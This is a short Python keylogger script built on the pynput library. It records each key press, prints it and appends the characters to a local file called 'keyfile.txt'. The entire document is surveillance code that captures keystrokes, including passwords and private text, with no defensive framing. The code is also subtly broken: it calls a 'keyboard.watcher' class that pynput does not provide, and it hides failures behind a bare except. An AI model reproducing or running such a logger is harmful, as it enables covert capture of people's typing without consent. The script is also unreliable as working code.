from pynput import keyboard

def keyClicked(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    watcher = keyboard.watcher(on_press=keyClicked)
    watcher.start()
    input()
